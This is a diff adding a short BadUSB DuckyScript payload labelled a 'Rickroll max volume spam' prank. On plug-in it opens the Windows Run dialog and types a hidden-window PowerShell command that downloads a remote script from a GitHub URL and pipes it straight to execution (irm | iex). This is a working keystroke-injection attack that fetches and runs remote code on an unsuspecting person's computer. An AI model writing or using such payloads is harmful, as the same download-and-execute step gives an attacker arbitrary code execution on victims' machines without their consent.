@@ -1,0 +1,5 @@
+REM Title: Rickroll max volume spam
+REM Description: open rickroll-max-volume a lot of times
+GUI r
+DELAY 500
+STRINGLN powershell -w h irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/window-spammer/rickroll-max-volume-spam.ps1 | iex
